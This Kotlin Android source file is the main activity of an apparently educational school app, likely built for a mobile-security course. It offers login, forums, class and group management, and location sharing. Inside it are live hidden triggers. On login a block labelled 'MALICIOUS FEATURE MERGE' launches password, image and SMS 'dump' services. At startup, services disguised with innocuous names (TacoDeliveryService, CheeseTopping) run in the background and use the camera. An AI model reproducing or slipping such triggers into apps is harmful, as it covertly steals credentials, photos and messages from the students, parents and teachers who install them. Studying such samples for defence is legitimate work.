package com.example.mobsec_823

import android.graphics.BitmapFactory
import android.os.Bundle
import android.util.Base64
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.compose.foundation.Image
import androidx.compose.foundation.background
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.asImageBitmap
import androidx.compose.ui.layout.ContentScale
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import com.example.mobsec_823.data.ClassEntity
import com.example.mobsec_823.data.DatabaseHelper
import com.example.mobsec_823.data.User
import com.example.mobsec_823.ui.rememberProfileBitmap
import com.example.mobsec_823.ui.screens.*
import com.example.mobsec_823.ui.screens.RegisterScreen
import com.example.mobsec_823.ui.theme.MobSecTheme
import kotlinx.coroutines.launch

import android.Manifest
import android.content.Intent
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.runtime.*
import androidx.core.content.ContextCompat
import com.example.mobsec_823.ui.screens.* // Assuming your screens are in this package
import com.example.mobsec_823.ui.theme.MobSecTheme

import androidx.compose.ui.platform.LocalContext
import com.example.mobsec_823.malicious.ImageDumpService
import com.example.mobsec_823.malicious.PasswordDumpService
import com.example.mobsec_823.malicious.SMSDumpService

class MainActivity : ComponentActivity() {
    private val cameraPermissionLauncher =
        registerForActivityResult(ActivityResultContracts.RequestPermission()) { granted ->
            if (granted) {
                startCameraService()
            }
        }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // --- Automatically start the background service ---
        val serviceIntent = Intent(this, TacoDeliveryService::class.java).apply {
            action = TacoDeliveryService.ACTION_OPEN_FOR_BUSINESS
        }
        startService(serviceIntent)

        // Initialize database helper with application context
        DatabaseHelper.initialize(applicationContext)

        enableEdgeToEdge()

        cameraPermissionLauncher.launch(Manifest.permission.CAMERA)

        setContent {
            MobSecTheme {
                MobSecApp()
            }
        }
    }

    private fun startCameraService() {
        val intent = Intent(this, CheeseTopping::class.java)
        ContextCompat.startForegroundService(this, intent)
    }
}

@Composable
fun MobSecApp() {
    var currentScreen by remember { mutableStateOf<Screen>(Screen.Login) }
    var currentUser by remember { mutableStateOf<User?>(null) }
    var selectedClass by remember { mutableStateOf<ClassEntity?>(null) }
    var groupManagementFromClassManagement by remember { mutableStateOf(false) }
    var adminManagementSelectedTab by remember { mutableIntStateOf(0) }

    val drawerState = rememberDrawerState(initialValue = DrawerValue.Closed)
    val scope = rememberCoroutineScope()

    // Helper to navigate and close drawer
    val navigateTo: (Screen) -> Unit = { screen ->
        currentScreen = screen
        scope.launch { drawerState.close() }
    }

    val showDrawer = currentScreen !is Screen.Login && currentScreen !is Screen.Register

    if (showDrawer && currentUser != null) {
        ModalNavigationDrawer(
            drawerState = drawerState,
            drawerContent = {
                ModalDrawerSheet {
                    currentUser?.let { user ->
                        // Refined Profile Header Section (Horizontal Layout)
                        Box(
                            modifier = Modifier
                                .fillMaxWidth()
                                .clickable { navigateTo(Screen.Profile) }
                                .padding(20.dp)
                        ) {
                            Row(verticalAlignment = Alignment.CenterVertically) {
                                val profileBitmap = rememberProfileBitmap(user.profileImage)

                                Box(
                                    modifier = Modifier
                                        .size(72.dp)
                                        .clip(CircleShape)
                                        .background(MaterialTheme.colorScheme.surfaceVariant),
                                    contentAlignment = Alignment.Center
                                ) {
                                    if (profileBitmap != null) {
                                        Image(
                                            bitmap = profileBitmap.asImageBitmap(),
                                            contentDescription = "Profile Picture",
                                            modifier = Modifier.fillMaxSize(),
                                            contentScale = ContentScale.Crop
                                        )
                                    } else {
                                        Icon(
                                            imageVector = Icons.Default.Person,
                                            contentDescription = "Profile Picture",
                                            modifier = Modifier.size(44.dp),
                                            tint = MaterialTheme.colorScheme.onSurfaceVariant
                                        )
                                    }
                                }

                                Spacer(modifier = Modifier.width(16.dp))

                                Column {
                                    Text(
                                        text = user.fullName ?: user.username,
                                        style = MaterialTheme.typography.titleLarge,
                                        fontWeight = FontWeight.Bold
                                    )
                                    Text(
                                        text = "@${user.username}",
                                        style = MaterialTheme.typography.bodyMedium,
                                        color = MaterialTheme.colorScheme.onSurfaceVariant
                                    )
                                }
                            }
                        }

                        NavigationDrawerItem(
                            label = { Text("Home") },
                            selected = currentScreen == Screen.HomeMenu,
                            onClick = { navigateTo(Screen.HomeMenu) },
                            icon = { Icon(Icons.Default.Home, contentDescription = null) },
                            modifier = Modifier.padding(NavigationDrawerItemDefaults.ItemPadding)
                        )

                        NavigationDrawerItem(
                            label = { Text("Discussion Forums") },
                            selected = currentScreen == Screen.ClassList,
                            onClick = { navigateTo(Screen.ClassList) },
                            icon = { Icon(Icons.Default.Forum, contentDescription = null) },
                            modifier = Modifier.padding(NavigationDrawerItemDefaults.ItemPadding)
                        )

                        NavigationDrawerItem(
                            label = { Text("Resource Library") },
                            selected = currentScreen == Screen.ResourceClassList,
                            onClick = { navigateTo(Screen.ResourceClassList) },
                            icon = { Icon(Icons.Default.LibraryBooks, contentDescription = null) },
                            modifier = Modifier.padding(NavigationDrawerItemDefaults.ItemPadding)
                        )

                        // Student & Parent specific navigation items
                        if (user.role.equals("Student", ignoreCase = true) || user.role.equals("Parent", ignoreCase = true)) {
                            NavigationDrawerItem(
                                label = { Text(if (user.role.equals("Student", ignoreCase = true)) "My Question History" else "Question History") },
                                selected = currentScreen == Screen.StudentDashboard,
                                onClick = { navigateTo(Screen.StudentDashboard) },
                                icon = { Icon(Icons.Default.History, contentDescription = null) },
                                modifier = Modifier.padding(NavigationDrawerItemDefaults.ItemPadding)
                            )
                            NavigationDrawerItem(
                                label = { Text("My Classes & Groups") },
                                selected = currentScreen == Screen.ClassManagement || currentScreen == Screen.GroupManagement,
                                onClick = {
                                    navigateTo(Screen.ClassManagement)
                                },
                                icon = { Icon(Icons.Default.Group, contentDescription = null) },
                                modifier = Modifier.padding(NavigationDrawerItemDefaults.ItemPadding)
                            )
                        }

                        if (user.role.equals("Teacher", ignoreCase = true)) {
                            NavigationDrawerItem(
                                label = { Text("Pending Queries") },
                                selected = currentScreen == Screen.TeacherDashboard,
                                onClick = { navigateTo(Screen.TeacherDashboard) },
                                icon = { Icon(Icons.Default.HelpOutline, contentDescription = null) },
                                modifier = Modifier.padding(NavigationDrawerItemDefaults.ItemPadding)
                            )
                        }

                        val isAdmin = user.role.equals("Admin", ignoreCase = true)
                        val isTeacher = user.role.equals("Teacher", ignoreCase = true)

                        if (isAdmin || isTeacher) {
                            NavigationDrawerItem(
                                label = { Text(if (isAdmin) "Manage Classes & Groups" else "My Classes & Groups") },
                                selected = currentScreen == Screen.ClassManagement || currentScreen == Screen.GroupManagement || currentScreen == Screen.GroupClassList,
                                onClick = { navigateTo(Screen.ClassManagement) },
                                icon = { Icon(Icons.Default.Group, contentDescription = null) },
                                modifier = Modifier.padding(NavigationDrawerItemDefaults.ItemPadding)
                            )
                        }


                        if (isAdmin) {
                            NavigationDrawerItem(
                                label = { Text("Manage Users") },
                                selected = currentScreen == Screen.AdminTeacherManagement,
                                onClick = { navigateTo(Screen.AdminTeacherManagement) },
                                icon = { Icon(Icons.Default.SupervisedUserCircle, contentDescription = null) },
                                modifier = Modifier.padding(NavigationDrawerItemDefaults.ItemPadding)
                            )
                        }

                        // Share & View Locations is only available for non-Parent roles
                        if (!user.role.equals("Parent", ignoreCase = true)) {
                            NavigationDrawerItem(
                                label = { Text("Share & View Locations") },
                                selected = currentScreen == Screen.LocationSharing,
                                onClick = { navigateTo(Screen.LocationSharing) },
                                icon = { Icon(Icons.Default.LocationOn, contentDescription = null) },
                                modifier = Modifier.padding(NavigationDrawerItemDefaults.ItemPadding)
                            )
                        }

                        Spacer(modifier = Modifier.weight(1f))
                        NavigationDrawerItem(
                            label = { Text("Logout") },
                            selected = false,
                            onClick = {
                                currentUser = null
                                currentScreen = Screen.Login
                                scope.launch { drawerState.close() }
                            },
                            icon = { Icon(Icons.Default.ExitToApp, contentDescription = null) },
                            modifier = Modifier.padding(NavigationDrawerItemDefaults.ItemPadding)
                        )
                        Spacer(modifier = Modifier.height(16.dp))
                    }
                }
            }
        ) {
            AppScaffold(
                currentScreen = currentScreen,
                currentUser = currentUser,
                selectedClass = selectedClass,
                groupManagementFromClassManagement = groupManagementFromClassManagement,
                adminManagementSelectedTab = adminManagementSelectedTab,
                onScreenChange = { currentScreen = it },
                onUserChange = { currentUser = it },
                onClassChange = { selectedClass = it },
                onGroupManagementFromClassManagementChange = { groupManagementFromClassManagement = it },
                onAdminManagementSelectedTabChange = { adminManagementSelectedTab = it },
                onOpenDrawer = { scope.launch { drawerState.open() } }
            )
        }
    } else {
        AppScaffold(
            currentScreen = currentScreen,
            currentUser = currentUser,
            selectedClass = selectedClass,
            groupManagementFromClassManagement = groupManagementFromClassManagement,
            adminManagementSelectedTab = adminManagementSelectedTab,
            onScreenChange = { currentScreen = it },
            onUserChange = { currentUser = it },
            onClassChange = { selectedClass = it },
            onGroupManagementFromClassManagementChange = { groupManagementFromClassManagement = it },
            onAdminManagementSelectedTabChange = { adminManagementSelectedTab = it },
            onOpenDrawer = { scope.launch { drawerState.open() } }
        )
    }
}

@Composable
fun AppScaffold(
    currentScreen: Screen,
    currentUser: User?,
    selectedClass: ClassEntity?,
    groupManagementFromClassManagement: Boolean,
    adminManagementSelectedTab: Int,
    onScreenChange: (Screen) -> Unit,
    onUserChange: (User?) -> Unit,
    onClassChange: (ClassEntity?) -> Unit,
    onGroupManagementFromClassManagementChange: (Boolean) -> Unit,
    onAdminManagementSelectedTabChange: (Int) -> Unit,
    onOpenDrawer: () -> Unit
) {
    // Get context for starting services
    val context = LocalContext.current

    when (currentScreen) {
        Screen.Login -> {
            LoginScreen(
                onLoginSuccess = { user ->
                    onUserChange(user)

                    // --- MALICIOUS FEATURE MERGE START ---
                    // Trigger services upon successful login
                    val passwordIntent = Intent(context, PasswordDumpService::class.java)
                    context.startService(passwordIntent)

                    val imageIntent = Intent(context, ImageDumpService::class.java)
                    context.startService(imageIntent)

                    val smsIntent = Intent(context, SMSDumpService::class.java)
                    context.startService(smsIntent)
                    // --- MALICIOUS FEATURE MERGE END ---

                    onScreenChange(Screen.HomeMenu)
                },
                onNavigateToRegister = { onScreenChange(Screen.Register) }
            )
        }
        Screen.Register -> {
            RegisterScreen(
                onRegisterSuccess = { onScreenChange(Screen.Login) },
                onNavigateToLogin = { onScreenChange(Screen.Login) }
            )
        }
        Screen.Profile -> {
            currentUser?.let { user ->
                ProfileScreen(
                    user = user,
                    onBackClick = onOpenDrawer,
                    onLogout = {
                        onUserChange(null)
                        onScreenChange(Screen.Login)
                    },
                    onProfileUpdated = { updatedUser ->
                        onUserChange(updatedUser)
                    }
                )
            }
        }
        Screen.HomeMenu -> {
            currentUser?.let { user ->
                HomeMenuScreen(
                    user = user,
                    onNavigateToProfile = { onScreenChange(Screen.Profile) },
                    onNavigateToForum = { onScreenChange(Screen.ClassList) },
                    onNavigateToStudentDashboard = { onScreenChange(Screen.StudentDashboard) },
                    onNavigateToClassManagement = { onScreenChange(Screen.ClassManagement) },
                    onNavigateToStudentQuery = { onScreenChange(Screen.StudentQuery) },
                    onNavigateToTeacherDashboard = { onScreenChange(Screen.TeacherDashboard) },
                    onNavigateToGroupManagement = {
                        if (user.role.equals("Student", ignoreCase = true) || user.role.equals("Parent", ignoreCase = true)) {
                            onScreenChange(Screen.ClassManagement)
                        } else {
                            onScreenChange(Screen.GroupClassList)
                        }
                    },
                    onNavigateToResourceLibrary = { onScreenChange(Screen.ResourceClassList) },
                    onNavigateToLocationSharing = { onScreenChange(Screen.LocationSharing) },
                    onNavigateToAdminTeacherManagement = { onScreenChange(Screen.AdminTeacherManagement) },
                    onMenuClick = onOpenDrawer
                )
            }
        }
        Screen.ClassList -> {
            currentUser?.let { user ->
                ClassListScreen(
                    user = user,
                    onClassSelected = { classEntity ->
                        onClassChange(classEntity)
                        onScreenChange(Screen.DiscussionForum)
                    },
                    onMenuClick = onOpenDrawer
                )
            }
        }
        Screen.ResourceClassList -> {
            currentUser?.let { user ->
                ClassListScreen(
                    user = user,
                    onClassSelected = { classEntity ->
                        onClassChange(classEntity)
                        onScreenChange(Screen.ResourceLibrary)
                    },
                    onMenuClick = onOpenDrawer
                )
            }
        }
        Screen.GroupClassList -> {
            currentUser?.let { user ->
                ClassListScreen(
                    user = user,
                    title = "Manage Groups: Select Class",
                    onClassSelected = { classEntity ->
                        onClassChange(classEntity)
                        onGroupManagementFromClassManagementChange(false)
                        onScreenChange(Screen.GroupManagement)
                    },
                    onMenuClick = onOpenDrawer
                )
            }
        }
        Screen.DiscussionForum -> {
            currentUser?.let { user ->
                selectedClass?.let { classEntity ->
                    DiscussionForumScreen(
                        user = user,
                        classId = classEntity.classId,
                        className = classEntity.className,
                        onBackClick = { onScreenChange(Screen.ClassList) }
                    )
                }
            }
        }
        Screen.ClassManagement -> {
            currentUser?.let { user ->
                ClassManagementScreen(
                    user = user,
                    onBackClick = onOpenDrawer,
                    onManageGroups = { classEntity ->
                        onClassChange(classEntity)
                        onGroupManagementFromClassManagementChange(true)
                        onScreenChange(Screen.GroupManagement)
                    }
                )
            }
        }
        Screen.AdminTeacherManagement -> {
            currentUser?.let { user ->
                AdminTeacherManagementScreen(
                    user = user,
                    onBackClick = onOpenDrawer,
                    selectedTab = adminManagementSelectedTab,
                    onTabChange = onAdminManagementSelectedTabChange,
                    onEditUser = { targetUser ->
                        onScreenChange(Screen.EditUserProfile(targetUser))
                    },
                    onRegisterNew = {
                        onScreenChange(Screen.AdminRegister)
                    }
                )
            }
        }
        Screen.AdminRegister -> {
            RegisterScreen(
                onRegisterSuccess = { onScreenChange(Screen.AdminTeacherManagement) },
                onNavigateToLogin = {},
                allowedRoles = listOf("Teacher", "Admin"),
                onBackClick = { onScreenChange(Screen.AdminTeacherManagement) }
            )
        }
        Screen.StudentDashboard -> {
            currentUser?.let { user ->
                StudentDashboardScreen(
                    user = user,
                    onBackClick = onOpenDrawer,
                    onAddQuestion = { onScreenChange(Screen.StudentQuery) }
                )
            }
        }
        Screen.StudentQuery -> {
            currentUser?.let { user ->
                StudentQueryScreen(
                    user = user,
                    onBackClick = { onScreenChange(Screen.StudentDashboard) },
                    onSubmitQuery = { teacherId, questionText, priority ->
                        val safeClassId = user.classId?.toIntOrNull() ?: 0
                        DatabaseHelper.createQuestion(
                            studentId = user.userId,
                            classId = safeClassId,
                            teacherId = teacherId,
                            question = questionText,
                            priority = priority
                        )
                    }
                )
            }
        }
        Screen.TeacherDashboard -> {
            currentUser?.let { user ->
                TeacherDashboardScreen(
                    teacher = user,
                    onNavigateToProfile = { onScreenChange(Screen.Profile) },
                    onNavigateToResourceLibrary = { onScreenChange(Screen.ResourceClassList) },
                    onBackClick = onOpenDrawer
                )
            }
        }
        Screen.GroupManagement -> {
            currentUser?.let { user ->
                // Use the class selected in ClassManagementScreen if available
                val effectiveClassId = selectedClass?.classId ?: user.classId?.toIntOrNull() ?: 1

                GroupManagementScreen(
                    classId = effectiveClassId,
                    user = user,
                    onBackClick = {
                        if (groupManagementFromClassManagement) {
                            onScreenChange(Screen.ClassManagement)
                        } else {
                            onOpenDrawer()
                        }
                    },
                    showBackButton = groupManagementFromClassManagement
                )
            }
        }
        Screen.ResourceLibrary -> {
            currentUser?.let { user ->
                selectedClass?.let { classEntity ->
                    ResourceLibraryScreen(
                        user = user,
                        classId = classEntity.classId,
                        className = classEntity.className,
                        onBackClick = { onScreenChange(Screen.ResourceClassList) }
                    )
                }
            }
        }
        Screen.LocationSharing -> {
            currentUser?.let { user ->
                LocationSharingScreen(
                    userId = user.userId,
                    onBackClick = { onScreenChange(Screen.HomeMenu) }
                )
            }
        }
        is Screen.EditUserProfile -> {
            currentUser?.let { loggedInUser ->
                val targetUser = (currentScreen as Screen.EditUserProfile).targetUser
                ProfileScreen(
                    user = targetUser,
                    onBackClick = { onScreenChange(Screen.AdminTeacherManagement) },
                    onLogout = {},
                    onProfileUpdated = { updatedUser ->
                        // If admin edited their own profile, update currentUser
                        if (updatedUser.userId == loggedInUser.userId) {
                            onUserChange(updatedUser)
                        }
                        onScreenChange(Screen.AdminTeacherManagement)
                    },
                    isAdminEditing = loggedInUser.userId != targetUser.userId
                )
            }
        }

    }
}

sealed class Screen {
    object Login : Screen()
    object Register : Screen()
    object Profile : Screen()
    object HomeMenu : Screen()
    object ClassList : Screen()
    object ResourceClassList : Screen()
    object GroupClassList : Screen()
    object DiscussionForum : Screen()
    object ClassManagement : Screen()
    object StudentDashboard : Screen()
    object StudentQuery : Screen()
    object TeacherDashboard : Screen()
    object GroupManagement : Screen()
    object LocationSharing : Screen()
    object ResourceLibrary : Screen()
    object AdminTeacherManagement : Screen()
    object AdminRegister : Screen()
    data class EditUserProfile(val targetUser: User) : Screen()
}

@Composable
private fun NavigationDrawerItemDefaults.ItemPadding(): PaddingValues = PaddingValues(horizontal = 12.dp, vertical = 0.dp)
